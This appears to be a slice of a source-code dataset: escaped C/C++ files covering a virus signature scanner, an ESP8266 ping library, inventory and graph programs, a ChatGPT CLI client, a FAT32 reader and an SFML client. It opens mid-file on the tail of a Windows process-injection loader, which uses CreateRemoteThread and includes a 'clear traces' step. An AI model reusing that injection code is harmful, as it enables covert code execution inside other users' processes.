\u4fee\u6539\u6ce8\u5165\u7a7a\u95f4\u7684\u5185\u5b58\u5c5e\u6027\r\n    DWORD oldProtect;\r\n    VirtualProtectEx(hProcess, pSections, sizeOfSections, PAGE_EXECUTE_READ, &oldProtect);\r\n\r\n    // \u521b\u5efa\u8fdc\u7a0b\u7ebf\u7a0b\u8c03\u7528 .shell \u6bb5\u7684 ImportDll \u51fd\u6570\uff0c\u4f7f\u76ee\u6807\u8fdb\u7a0b\u5bfc\u5165 Sections \u6240\u9700\u7684 DLL\r\n    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)pSections - sizeOfHeaders + 0x11000), (PVOID)((DWORD_PTR)pSections + sizeOfSections), 0, NULL);\r\n\r\n    // \u6e05\u9664\u75d5\u8ff9\r\n    memset(pInjectSections, 0, sizeOfSections);\r\n    free(pInjectSections);\r\n\r\n    // \u9632\u6b62 ImportDll \u51fd\u6570\u88ab\u4f18\u5316\u6d88\u5931\r\n    while (1);\r\n    ImportDll(NULL);\r\n}\r\n",
    "#include \"dettector.h\"\n#include <exception>\n\n#define READ_BINARY_MODE \"rb\"\n#define ELF_FILE_SIZE 4\n\n\ndettector::dettector(std::string VirusPath,std::string filePAth)\n/*\nget all the neccery data to start the test\ninput:virusPath-the path of the virus sig,\nfilePath-the path to the folder you want to scan\noutput:none\n*/\n{\n    int start_place=0;\n    FILE* virus=fopen(VirusPath.c_str(),READ_BINARY_MODE);\n    this->file=opendir(filePAth.c_str());\n    if(virus==NULL||this->file==NULL)\n    {\n        throw std::string(\"coudn't open on of the path you wrote, try a difrant ones:)\\n\");\n    }\n    if(this->isElfFile(virus))\n    //in case the sig is a elf file\n    {\n        start_place=ELF_FILE_SIZE;\n    }\n    fseek(virus,start_place,SEEK_END);\n    this->virusSize=ftell(virus);//get the size\n    fseek(virus,start_place,SEEK_SET);\n    this->virusInfo=this->getInfoFromFile(virus,this->virusSize);\n    fclose(virus);\n    this->filePath=filePAth;\n    this->virusSize=this->virusInfo.size();\n}\n\nstd::vector<unsigned char> dettector::getInfoFromFile(FILE* file,int size)\n/*\ngets from file a chanck of info and returning to one byte after the start of the data collection\ninput:file-the file to take data,size-the amount of data\noutput: a chank of data from file\n*/\n{\n    std::vector<unsigned char> infoFile;\n    char curr=fgetc(file);\n    auto currentPlace=ftell(file);\n    for(int i=0;i<size&&(curr!=EOF);i++)\n    {\n        infoFile.push_back((unsigned char)curr);\n        curr=fgetc(file);\n    }\n    fseek(file,currentPlace,SEEK_SET);//to move it to the next char\n    return infoFile;\n}\n\nbool dettector::compareSig(std::vector<unsigned char> info1)\n/*\ncompare chank of data to the virus sig\ninnput:info1-the chank of data to compare to\noutput:true-identical,false-diffrant\n*/\n{\n    if(info1.size()==this->virusInfo.size())\n    {\n        for(int i=0;i<info1.size();i++)\n        {\n            if(this->virusInfo[i]!=info1[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    return false;\n}\n\nstd::string dettector::createFilePath(struct dirent* pb)\n/*create the path to the file from the dir\ninput:pb-the data on every file\noutput:c_arr of the file path*/\n{\n    std::string path=this->filePath+\"/\"+pb->d_name;\n    return path;\n}\n\nbool dettector::scanFile(FILE* file)\n/*scan for virus sig in file(if the file is infacted)\ninput:file to check\noutput:true-infactes(has sig),false-not infacted*/\n{\n    std::vector<unsigned char> info=this->getInfoFromFile(file,this->virusSize);\n    while(info.size()==this->virusSize)\n    {\n        if(this->compareSig(info))\n        {\n            return true;\n        }\n        info=this->getInfoFromFile(file,this->virusSize);\n    }\n    return false;\n}\n\nstd::map<std::string,bool> dettector::scanFolder()\n/*\nrun over on all the files in folder to check for infacted files\ninput:none\noutput:a map with file name and if it was infected\n*/\n{\n    std::map<std::string,bool> res;\n    struct dirent* dp=nullptr;\n    FILE* currFile=nullptr;\n    while((dp=readdir(this->file))!=nullptr)\n    {\n        if(dp->d_type!=DT_DIR&&dp->d_name[0]!='.')//aliminate the files in the dir\n        {\n            currFile=fopen(this->createFilePath(dp).c_str(),READ_BINARY_MODE);\n            if(currFile!=NULL)\n            {\n                if(this->isElfFile(currFile))\n                {\n                    res[dp->d_name]=this->scanFile(currFile);\n                    if(res[dp->d_name])\n                    {\n                        std::cout<<\"File \"<<this->createFilePath(dp)<<\" is infected!\"<<std::endl;\n                    }\n                }\n                fclose(currFile);\n            }\n            else\n            {\n                std::cout<<\"coudnt open file: \"<<this->createFilePath(dp);\n            }\n        }\n    }\n    return res;\n}\n\nbool dettector::isElfFile(FILE* file)\n/*\ncheck if file is an elf file\ninput:file-to read the file\noutput:true-elf file,false-other file type\n*/\n{\n    char elfSig[]={0x7f, 'E', 'L', 'F'};\n    std::vector<unsigned char> info=this->getInfoFromFile(file,ELF_FILE_SIZE);\n    fseek(file,ELF_FILE_SIZE,SEEK_SET);\n    if(info.size()==ELF_FILE_SIZE&&info[0]==0x7f&&info[1]=='E'\n    &&info[2]=='L'&&info[3]=='F')\n    {\n        return true;\n    }\n    return false;\n}\n\ndettector::~dettector()\n{\n    closedir(this->file);\n}",
    "/*\n  ESP8266Ping - Ping library for ESP8266\n  Copyright (c) 2015 Daniele Colanardi. All rights reserved.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include \"ESP8266Ping.h\"\n\nextern \"C\" void esp_schedule();\n\nPingClass::PingClass() :\n  _expected_count(0),\n  _errors(0),\n  _success(0),\n  _min_time(0),\n  _avg_time(0),\n  _max_time(0)\n{\n}\n\nbool PingClass::ping(IPAddress dest, unsigned int count) \n{\n  _expected_count = count;\n  _errors = 0;\n  _success = 0;\n\n  _min_time = INT_MAX;\n  _avg_time = 0;\n  _max_time = 0;\n\n  _done = false;\n  \n  memset(&_options, 0, sizeof(struct ping_option));\n\n  // Repeat count (how many time send a ping message to destination)\n  _options.count = count;\n  // Time interval between two ping (seconds??)\n  _options.coarse_time = 1;\n  // Destination machine\n  _options.ip = dest;\n  // A reference to this instance to access its fields\n  _options.reverse = this;\n\n  // Callbacks\n  _options.recv_function = reinterpret_cast<ping_recv_function>(&PingClass::_ping_recv_cb);\n  _options.sent_function = NULL; //reinterpret_cast<ping_sent_function>(&_ping_sent_cb);\n\n  // Let's go!\n  if(ping_start(&_options))\n  {\n    // Suspend till the process end\n    unsigned int delay_time = _options.coarse_time * 1000;\n    // Wait until the process is done\n    // NOTE: delay() is interrupted by esp_schedule()\n    while (!_done)\n      delay(delay_time);\n  }\n\n  return (_success > 0);\n}\n\nbool PingClass::ping(const char* host, unsigned int count)\n{\n  IPAddress remote_addr;\n\n  if (WiFi.hostByName(host, remote_addr))\n    return ping(remote_addr, count);\n\n  return false;\n}\n\nint PingClass::minTime() \n{\n  return _min_time;\n}\n\nint PingClass::averageTime()\n{\n  return _avg_time;\n}\n\nint PingClass::maxTime()\n{\n  return _max_time;\n}\n\nvoid PingClass::_ping_recv_cb(void *opt, void *resp)\n{\n  // Cast the parameters to get some usable info\n  ping_resp*   ping_resp = reinterpret_cast<struct ping_resp*>(resp);\n  ping_option* ping_opt  = reinterpret_cast<struct ping_option*>(opt);\n\n  PingClass* self = reinterpret_cast<PingClass*>(ping_opt->reverse);\n\n  // Error or success?\n  if (ping_resp->ping_err == -1)\n    self->_errors++;\n  else\n  {\n    self->_success++;\n    self->_avg_time += ping_resp->resp_time;\n    if(ping_resp->resp_time < self->_min_time)\n      self->_min_time = ping_resp->resp_time;\n    if(ping_resp->resp_time > self->_max_time)\n      self->_max_time = ping_resp->resp_time; \n  }\n\n  // Some debug info\n  DEBUG_PING(\n      \"DEBUG: ping reply\\n\"\n      \"\\ttotal_count = %d \\n\"\n      \"\\tresp_time = %d \\n\"\n      \"\\tseqno = %d \\n\"\n      \"\\ttimeout_count = %d \\n\"\n      \"\\tbytes = %d \\n\"\n      \"\\ttotal_bytes = %d \\n\"\n      \"\\ttotal_time = %d \\n\"\n      \"\\tping_err = %d \\n\",\n      ping_resp->total_count, ping_resp->resp_time, ping_resp->seqno,\n      ping_resp->timeout_count, ping_resp->bytes, ping_resp->total_bytes,\n      ping_resp->total_time, ping_resp->ping_err\n  );\n\n  // Is it time to end?\n  // Don't using seqno because it does not increase on error\n  if (self->_success + self->_errors == self->_expected_count)\n  {\n    self->_avg_time = self->_success > 0 ? self->_avg_time / self->_success : 0;\n\n    DEBUG_PING(\"Resp times min %d, avg %d, max %d ms\\n\", self->_min_time, self->_avg_time, self->_max_time);\n\n    // Done, return to main function\n    self->_done = true;\n    esp_schedule();\n  }\n}\n\nPingClass Ping;",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n// Structure to represent an item\r\nstruct Item {\r\n    string name;\r\n    double price;\r\n    int quantity;\r\n};\r\n\r\n// Constants\r\nconst int MAX_ITEMS = 100;\r\nItem inventory[MAX_ITEMS];\r\nint itemCount = 0;\r\ndouble totalSales = 0;\r\n\r\n// Function prototypes\r\nvoid addItem();\r\nvoid removeItem();\r\nvoid displayInventory();\r\nvoid processSale();\r\nvoid displayTotalSales();\r\nvoid saveData();\r\nvoid retrieveData();\r\n\r\nint main() {\r\n    // Retrieve saved data\r\n    retrieveData();\r\n\r\n    int choice;\r\n    do {\r\n        cout << \"\\n1. Display Inventory\\n2. Process Sale\\n3. Display Total Sales\\n4. Add Item\\n5. Delete Item\\n6. Save Data\\n7. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n        case 1:\r\n            displayInventory();\r\n            break;\r\n        case 2:\r\n            processSale();\r\n            break;\r\n        case 3:\r\n            displayTotalSales();\r\n            break;\r\n        case 4:\r\n            addItem();\r\n            break;\r\n        case 5:\r\n            removeItem();\r\n            break;\r\n        case 6:\r\n            saveData();\r\n            cout << \"Data saved.\\n\";\r\n            break;\r\n        case 7:\r\n            cout << \"Exiting program.\\n\";\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    } while (choice != 7);\r\n\r\n    return 0;\r\n}\r\n\r\n// Function to add an item to inventory\r\nvoid addItem() {\r\n    if (itemCount >= MAX_ITEMS) {\r\n        cout << \"Inventory is full. Cannot add more items.\\n\";\r\n        return;\r\n    }\r\n\r\n    cout << \"Enter item name: \";\r\n    cin >> inventory[itemCount].name;\r\n    cout << \"Enter item price: \";\r\n    cin >> inventory[itemCount].price;\r\n    cout << \"Enter item quantity: \";\r\n    cin >> inventory[itemCount].quantity;\r\n\r\n    itemCount++;\r\n    cout << \"Item added to inventory.\\n\";\r\n}\r\n\r\n// Function to remove an item from inventory\r\nvoid removeItem() {\r\n    if (itemCount == 0) {\r\n        cout << \"Inventory is empty. Cannot remove items.\\n\";\r\n        return;\r\n    }\r\n\r\n    int id;\r\n    cout << \"Enter item ID to delete: \";\r\n    cin >> id;\r\n\r\n    if (id >= 1 && id <= itemCount) {\r\n        // Remove item by shifting elements\r\n        for (int i = id - 1; i < itemCount - 1; ++i) {\r\n            inventory[i] = inventory[i + 1];\r\n        }\r\n        itemCount--;\r\n        cout << \"Item deleted from inventory.\\n\";\r\n    }\r\n    else {\r\n        cout << \"Invalid item ID.\\n\";\r\n    }\r\n}\r\n\r\n// Function to display inventory\r\nvoid displayInventory() {\r\n    cout << \"Inventory:\\n\";\r\n    cout << \"ID\\tName\\tPrice\\tQuantity\\n\";\r\n    for (int i = 0; i < itemCount; ++i) {\r\n        cout << i + 1 << \"\\t\" << inventory[i].name << \"\\t\" << inventory[i].price << \"\\t\" << inventory[i].quantity << endl;\r\n    }\r\n}\r\n\r\n// Function to process a sale\r\nvoid processSale() {\r\n    int id, quantity;\r\n    cout << \"Enter item ID and quantity: \";\r\n    cin >> id >> quantity;\r\n\r\n    if (id >= 1 && id <= itemCount) {\r\n        if (inventory[id - 1].quantity >= quantity) {\r\n            double total = quantity * inventory[id - 1].price;\r\n            cout << \"Total sale amount: $\" << total << endl;\r\n            inventory[id - 1].quantity -= quantity;\r\n            totalSales += total;\r\n        }\r\n        else {\r\n            cout << \"Insufficient quantity in stock.\\n\";\r\n        }\r\n    }\r\n    else {\r\n        cout << \"Invalid item ID.\\n\";\r\n    }\r\n}\r\n\r\n// Function to display total sales\r\nvoid displayTotalSales() {\r\n    cout << \"Total Sales: $\" << totalSales << endl;\r\n}\r\n\r\n// Function to save data to files\r\nvoid saveData() {\r\n    ofstream inventoryFile(\"inventory.txt\");\r\n    if (inventoryFile.is_open()) {\r\n        inventoryFile << itemCount << endl;\r\n        for (int i = 0; i < itemCount; ++i) {\r\n            inventoryFile << inventory[i].name << \" \" << inventory[i].price << \" \" << inventory[i].quantity << endl;\r\n        }\r\n        inventoryFile.close();\r\n    }\r\n\r\n    ofstream salesFile(\"sales.txt\");\r\n    if (salesFile.is_open()) {\r\n        salesFile << totalSales << endl;\r\n        salesFile.close();\r\n    }\r\n}\r\n\r\n// Function to retrieve data from files\r\nvoid retrieveData() {\r\n    ifstream inventoryFile(\"inventory.txt\");\r\n    if (inventoryFile.is_open()) {\r\n        inventoryFile >> itemCount;\r\n        for (int i = 0; i < itemCount; ++i) {\r\n            inventoryFile >> inventory[i].name >> inventory[i].price >> inventory[i].quantity;\r\n        }\r\n        inventoryFile.close();\r\n    }\r\n\r\n    ifstream salesFile(\"sales.txt\");\r\n    if (salesFile.is_open()) {\r\n        salesFile >> totalSales;\r\n        salesFile.close();\r\n    }\r\n}",
    "#include <iostream>\r\n#include \"ListaEnlazada.h\"\r\n#include \"Pila.h\"\r\n#include \"Cola.h\"\r\n#include \"ArbolBinario.h\"\r\n#include \"Grafo.h\"\r\n#include \"AlgoritmosOrdenamiento.h\"\r\n#include \"AlgoritmosGrafo.h\"\r\n\r\nint main() {\r\n    // Ejemplo de uso de lista enlazada\r\n    ListaEnlazada<int> lista;\r\n    lista.insertarAlFinal(10);\r\n    lista.insertarAlFinal(20);\r\n    lista.insertarAlFinal(30);\r\n    lista.mostrar();\r\n\r\n    // Ejemplo de uso de pila\r\n    Pila<int> pila;\r\n    pila.apilar(10);\r\n    pila.apilar(20);\r\n    pila.apilar(30);\r\n    while (!pila.estaVacia()) {\r\n        std::cout << \"Pila desapilar: \" << pila.desapilar() << std::endl;\r\n    }\r\n\r\n    // Ejemplo de uso de cola\r\n    Cola<int> cola;\r\n    cola.encolar(10);\r\n    cola.encolar(20);\r\n    cola.encolar(30);\r\n    while (!cola.estaVacia()) {\r\n        std::cout << \"Cola desencolar: \" << cola.desencolar() << std::endl;\r\n    }\r\n\r\n    // Ejemplo de uso de \u00e1rbol binario\r\n    ArbolBinario<int> arbol;\r\n    arbol.insertar(10);\r\n    arbol.insertar(20);\r\n    arbol.insertar(5);\r\n    arbol.recorridoInOrden();\r\n\r\n    // Ejemplo de uso de grafos y algoritmos\r\n    Grafo<int> grafo;\r\n    grafo.agregarArista(0, 1);\r\n    grafo.agregarArista(0, 2);\r\n    grafo.agregarArista(1, 2);\r\n    grafo.agregarArista(2, 0);\r\n    grafo.agregarArista(2, 3);\r\n    grafo.agregarArista(3, 3);\r\n\r\n    BFS(grafo, 2);\r\n    DFS(grafo, 2);\r\n    Dijkstra(grafo, 0);\r\n\r\n    // Algoritmos de ordenamiento\r\n    int arr[] = {12, 11, 13, 5, 6, 7};\r\n    int tamano = sizeof(arr)/sizeof(arr[0]);\r\n\r\n    quickSort(arr, 0, tamano - 1);\r\n    std::cout << \"Array ordenado (QuickSort): \\n\";\r\n    imprimirArray(arr, tamano);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <limits>\n#include <fstream>\n#include <queue>\n\nusing namespace std;\n\n// Define structures for nodes, edges, and graph\nstruct Edge {\n    int source, destination, weight;\n};\n\nstruct Place {\n    int id;\n    string type;\n    string name;\n};\n\nstruct Node {\n    Place place;\n    vector<Edge> edges;\n};\n\nclass Graph {\n\n\npublic:\nvector<Node> nodes;\n    void addNode(int id, const string& type, const string& name) {\n        Place newPlace = {id, type, name};\n        Node newNode = {newPlace};\n        nodes.push_back(newNode);\n    }\n\n    void addEdge(int source, int dest, int weight) {\n        Edge newEdge = {source, dest, weight};\n        nodes[source].edges.push_back(newEdge);\n        nodes[dest].edges.push_back(newEdge); // Assuming undirected graph\n    }\n\n    pair<vector<int>, vector<int>> dijkstraShortestPath(int start) {\n        vector<int> dist(nodes.size(), numeric_limits<int>::max());\n        vector<int> prevNode(nodes.size(), -1);\n        vector<bool> visited(nodes.size(), false);\n        priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\n\n        dist[start] = 0;\n        pq.push({0, start});\n\n        while (!pq.empty()) {\n            int u = pq.top().second;\n            pq.pop();\n\n            if (visited[u]) continue;\n            visited[u] = true;\n\n            for (const auto &edge : nodes[u].edges) {\n                int v = edge.source == u ? edge.destination : edge.source;\n                int weight = edge.weight;\n\n                if (!visited[v] && dist[u] + weight < dist[v]) {\n                    dist[v] = dist[u] + weight;\n                    prevNode[v] = u;\n                    pq.push({dist[v], v});\n                }\n            }\n        }\n\n        return {dist, prevNode};\n    }\n\n    vector<Edge> primMST() {\n        vector<Edge> result;\n        vector<bool> visited(nodes.size(), false);\n        vector<int> parent(nodes.size(), -1);\n        vector<int> minWeight(nodes.size(), numeric_limits<int>::max());\n        int src;\n        cout<<\"Enter source ID: \";\n        cin>>src;\n        minWeight[src] = 0;\n        priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\n        pq.push({src, 0});\n\n        while (!pq.empty()) {\n            int u = pq.top().second;\n            pq.pop();\n\n            if (visited[u]) continue;\n            visited[u] = true;\n\n            for (const auto &edge : nodes[u].edges) {\n                int v = edge.source == u ? edge.destination : edge.source;\n                int weight = edge.weight;\n\n                if (!visited[v] && weight < minWeight[v]) {\n                    parent[v] = u;\n                    minWeight[v] = weight;\n                    pq.push({weight, v});\n                }\n            }\n        }\n\n        for (int i = 1; i < nodes.size(); ++i) {\n            result.push_back({parent[i], i, minWeight[i]});\n        }\n\n        return result;\n    }\n};\n\nvoid printShortestPaths(const vector<int> &shortestPaths, const vector<int> &prevNode, const vector<Node>& nodes) {\n    ofstream outputFile(\"output.txt\", ios::app);\n\n    if (!outputFile.is_open()) {\n        cout << \"Error opening file for writing.\" << endl;\n        return;\n    }\n\n    outputFile << \"Shortest Paths from src node:\" << endl;\n\n    int shortestCost = numeric_limits<int>::max();\n    vector<int> shortestPath;\n\n    for (int i = 0; i < shortestPaths.size(); ++i) {\n        outputFile << \"Node \" << nodes[i].place.id << \" (\" << nodes[i].place.name << \"): \" << shortestPaths[i] << \" | Path: \";\n        cout << \"Node \" << nodes[i].place.id << \" (\" << nodes[i].place.name << \"): \" << shortestPaths[i] << \" | Path: \";\n        vector<int> path;\n        int cur = i;\n        while (cur != -1) {\n            path.push_back(cur);\n            cur = prevNode[cur];\n        }\n        //reverse(path.begin(), path.end());\n        for (int j = 0; j < path.size(); ++j) {\n            outputFile << nodes[path[j]].place.name;\n            cout<< nodes[path[j]].place.name;\n            if (j != path.size() - 1) {\n                outputFile << \" -> \";\n                cout << \" -> \";\n            }\n        }\n        outputFile << endl;\n        cout << endl;\n\n        // Calculate shortest cost path\n        if (shortestPaths[i] < shortestCost && shortestPaths[i]!=0) {\n            shortestCost = shortestPaths[i];\n            shortestPath = path;\n        }\n    }\n\n    outputFile << \"Shortest Cost Path: \";\n    for (int i = 0; i < shortestPath.size(); ++i) {\n        outputFile << nodes[shortestPath[i]].place.name;\n        if (i != shortestPath.size() - 1) {\n            outputFile << \" -> \";\n        }\n    }\n    cout << \"Shortest Cost Path: \";\n    for (int i = 0; i < shortestPath.size(); ++i) {\n        cout << nodes[shortestPath[i]].place.name;\n        if (i != shortestPath.size() - 1) {\n           cout<< \" -> \";\n        }\n    }\n    cout << \" | Cost: \" << shortestCost << endl;\n    outputFile << \" | Cost: \" << shortestCost << endl;",
    "#include <boost/program_options.hpp>\n#include <fstream>\n#include <iostream>\n#include <regex>\n#include <string>\n#include <curl/curl.h>\n#include <sys/socket.h>\n#include <netdb.h>\n#include <json/json.h>\n#include <arpa/inet.h>\n#include \"chatgptclient.h\"\n\nnamespace po = boost::program_options;\n\n// Global logfile\nstd::ofstream logfile;\n\n\nint main(int argc, char *argv[])\n{\n    // Variable declarations\n    std::string chatgpt_key;\n    std::string question;\n    std::string key_file = \"key.txt\";\n\n    // Open the logfile\n    logfile.open(\"debug.log\", std::ios_base::app);\n\n    // Command line options setup\n    po::options_description desc(\"Allowed options\");\n    desc.add_options()(\"help\", \"produce help message\")(\"key\", po::value<std::string>(&chatgpt_key), \"set the chatgpt key\")(\"ask\", po::value<std::string>(&question), \"ask a question to chatgpt\");\n\n    po::variables_map vm;\n    po::store(po::parse_command_line(argc, argv, desc), vm);\n    po::notify(vm);\n\n    // Help option handling\n    if (vm.count(\"help\"))\n    {\n        std::cout << desc << \"\\n\";\n        return 1;\n    }\n\n    // Initialize the conversation history with a system message\n    Json::Value conversation_history;\n    Json::Value system_message;\n    system_message[\"role\"] = \"system\";\n    system_message[\"content\"] = \"Hello, I'm a chatbot that can answer your questions. You can ask me anything.\";\n    conversation_history.append(system_message);\n\n    // Load chatgpt key from file or command line argument\n    std::ifstream file(key_file);\n    if (file)\n    {\n        std::getline(file, chatgpt_key);\n        std::cout << \"chatgpt key was loaded from file.\\n\";\n    }\n\n    if (vm.count(\"key\"))\n    {\n        std::regex key_format(\"^sk-.*$\");\n        if (std::regex_match(chatgpt_key, key_format))\n        {\n            std::ofstream out(key_file);\n            out << chatgpt_key;\n            out.close();\n            std::cout << \"chatgpt key was saved to file.\\n\";\n        }\n        else\n        {\n            std::cout << \"Invalid chatgpt key format.\\n\";\n            return 1;\n        }\n    }\n    else if (vm.count(\"ask\"))\n    {\n        // Check if api key is defined\n        if (chatgpt_key.empty())\n        {\n            std::cout << \"chatgpt key is not defined.\\n\";\n            return 1;\n        }\n        question = vm[\"ask\"].as<std::string>(); // Set question with the ask value\n        std::cout << \"\\033[32mUser: \\033[0m\" << question << \"\\033[32m\\n\";\n\n        std::string response = ask_chatgpt(chatgpt_key, question, conversation_history);\n\n        std::cout << \"\\033[34mIA: \" << response << \"\\033[0m\\n\";  // Blue color\n    }\n    else\n    {\n        std::cout << \"chatgpt key was not set.\\n\";\n        return 1;\n    }\n\n    // Ask a question to chatgpt\n    while (true)\n    {\n        // Ask the user for another question\n        std::cout << \"\\033[32mUser: \\033[0m\";\n        std::getline(std::cin, question);\n\n        // Check if the user wants to exit\n        if (question == \"stop\")\n        {\n            break;\n        }\n\n        // Call the function to ask the question to chatgpt\n        std::string response = ask_chatgpt(chatgpt_key, question, conversation_history);\n        std::cout << \"\\033[34mIA: \" << response << \"\\033[0m\\n\";  // Blue color\n    }\n\n    // Close the logfile\n    logfile.close();\n\n    return 0;\n}\n\n\n\n",
    "#include <fstream>\n#include <ios>\n#include <iostream>\n#include <cstring>\n#include <string>\n#include <vector>\n\n#include \"extras.h\"\n\nstd::vector<DirectoryEntry> currentDirEntries;\n\ntemplate <class T>\nvoid read(T* result, std::ifstream& in) {\n    int size = sizeof(T);\n\n    unsigned char* bytes = new unsigned char[size];\n    in.read((char*)bytes, size);\n\n    T r = 0;\n\n    for (int i = size - 1; i >= 0; i--) {\n        r <<= 8;\n        r |= bytes[i];\n    }\n    \n    *result = r;\n}\n\nvoid readBPB(BPB* bpb, std::ifstream& in) {\n    in.read((char*)bpb->jmp, 3);\n    in.read((char*)bpb->oem, 8);\n    bpb->oem[8] = '\\0';\n    read(&bpb->bytesPerSector, in);\n    read(&bpb->sectorsPerCluster, in);\n    read(&bpb->reservedSectors, in);\n    read(&bpb->FATs, in);\n    read(&bpb->rootDirectoryEntries, in);\n    read(&bpb->sectorsCount, in);\n    read(&bpb->mediaDescriptorType, in);\n    in.ignore(2); // Number of sectors per FAT-> This is only for FAT12 and FAT16\n    read(&bpb->sectorsPerTrack, in);\n    read(&bpb->headsCount, in);\n    read(&bpb->hiddenSectors, in);\n    read(&bpb->sectorsCount_large, in);\n}\n\nvoid readEBPB(EBPB* ebpb, std::ifstream& in) {\n    read(&ebpb->sectorsPerFAT, in);\n    read(&ebpb->flags, in);\n    read(&ebpb->FATVersion, in);\n    read(&ebpb->rootDirCluster, in);\n    read(&ebpb->FSInfoSector, in);\n    read(&ebpb->backupBootSector, in);\n    in.ignore(12); // Reserved\n    read(&ebpb->driveNumber, in);\n    in.ignore(1); // Reserved\n    read(&ebpb->signature, in);\n    read(&ebpb->volumeId, in);\n    in.read((char*)&ebpb->volumeLabel, 11);\n    ebpb->volumeLabel[11] = '\\0';\n    in.read((char*)&ebpb->systemId, 8);\n    ebpb->systemId[8] = '\\0';\n    in.ignore(420); // Boot code\n    in.ignore(2); // Bootable partition signature (0xAA55)\n}\n\nvoid readFSInfo(BPB bpb, EBPB ebpb, FSInfo* fsInfo, std::ifstream& in) {\n    // FSInfo\n    in.seekg(ebpb.FSInfoSector * bpb.bytesPerSector); // seek to FSInfo start location\n    read(&fsInfo->topSignature, in);\n    in.ignore(480); // Reserved\n    read(&fsInfo->middleSignature, in);\n    read(&fsInfo->freeClusters, in);\n    read(&fsInfo->availableClusterStart, in);\n    in.ignore(12); // Reserved\n    read(&fsInfo->bottomSignature, in);\n}\n\nunsigned int getNextCluster(BPB bpb, std::ifstream& in, int cluster) {\n    const int firstFATSector = bpb.reservedSectors;\n    const int offset = cluster * 4; // Each cluster address is 4 bytes in FAT32\n    unsigned int result;\n\n    in.seekg(firstFATSector * bpb.bytesPerSector + offset);\n    read(&result, in);\n\n    return result & 0x0FFFFFFF; // only 28 bits are used\n}\n\nint getClusterAddress(BPB bpb, EBPB ebpb, int cluster) {\n    const int firstDataSector = bpb.reservedSectors + (bpb.FATs * ebpb.sectorsPerFAT);\n    return ((cluster - 2) * bpb.sectorsPerCluster + firstDataSector) * bpb.bytesPerSector;\n}\n\nvoid readDirectory(BPB bpb, EBPB ebpb, std::ifstream& in, int cluster) {\n    const int firstFATSector = bpb.reservedSectors;\n    const int firstDataSector = firstFATSector + (bpb.FATs * ebpb.sectorsPerFAT);\n\n    // Go to the address of the root directory's first cluster\n    in.seekg(getClusterAddress(bpb, ebpb, cluster));\n\n    int origin = in.tellg();\n    int currentCluster = cluster;\n    std::string longNameBuffer;\n\n    // erase list of entries\n    currentDirEntries.clear();\n    while (true) {\n        unsigned char firstByte, eleventhByte;\n        read(&firstByte, in);\n        in.seekg((int)in.tellg() + 10);\n        read(&eleventhByte, in);\n        in.seekg((int)in.tellg() - 12); // go back one byte, so we can read it again\n\n        // long filename entry\n        if (eleventhByte == 0x0F) {\n            LFNDirectoryEntry entry;\n            read(&entry.order, in);\n            in.read((char*)&entry.topName, 10);\n            in.ignore(); // the eleventh byte\n            read(&entry.longEntryType, in);\n            read(&entry.checksum, in);\n            in.read((char*)&entry.middleName, 12);\n            in.ignore(2); // always zero\n            in.read((char*)&entry.bottomName, 4);\n\n            assembleName(longNameBuffer, entry);\n            continue;\n        }\n        // test the first byte\n        // end of directory\n        if (firstByte == 0x00) break;\n        // unused entry\n        if (firstByte == 0xE5) {\n            in.seekg((int)in.tellg() + 32);\n            continue;\n        }\n\n        DirectoryEntry entry;\n        in.read((char*)&entry.filename, 11);\n        entry.filename[11] = '\\0';\n        read(&entry.attributes, in);\n        in.ignore(); // Reserved\n        read(&entry.creationTimeHS, in);\n        read(&entry.creationTime, in);\n        read(&entry.creationDate, in);\n        read(&entry.lastAccessedDate, in);\n        read(&entry.firstClusterHigh, in);\n        read(&entry.lastModificationTime, in);\n        read(&entry.lastModificationDate, in);\n        read(&entry.firstClusterLow, in);\n        read(&entry.size, in);\n\n        if (!longNameBuffer.empty()) {\n            entry.longFilename = longNameBuffer;\n        }\n        currentDirEntries.push_back(",
    "\ufeff#include <SFML/Network.hpp>\n#include <mutex>\n#include <condition_variable>\n\n#include \"iniManager/iniManager.h\"\n#include \"MessageQueue.h\"\n\nstd::mutex messageMutex;\nstd::condition_variable messageCondition;\n\nvoid receiveMessages(sf::TcpSocket& socket, MessageQueue& messageQueue)\n{\n    while (true)\n    {\n        char data[255];\n        std::size_t received;\n        if (socket.receive(data, sizeof(data), received) == sf::Socket::Done)\n        {\n            // \u041f\u043e\u043c\u0435\u0449\u0430\u0435\u043c \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u043e\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0432 \u043e\u0447\u0435\u0440\u0435\u0434\u044c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439\n            std::lock_guard<std::mutex> lock(messageMutex);\n            messageQueue.push(std::string(data, received));\n            messageCondition.notify_one();\n        }\n    }\n}\n\nvoid printReceiveMessage(MessageQueue& messageQueue)\n{\n    while (true)\n    {\n        std::unique_lock<std::mutex> lock(messageMutex);\n        messageCondition.wait(lock, [&messageQueue] { return !messageQueue.empty(); });\n\n        std::string serverMessage = messageQueue.pop();\n        lock.unlock();\n\n        std::cout << \"Message from server: \" << serverMessage << std::endl;\n    }\n}\n\nint main(int argc, char* argv[])\n{\n    //initialization file processing       \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u043f\u0443\u0442\u044c \u043a 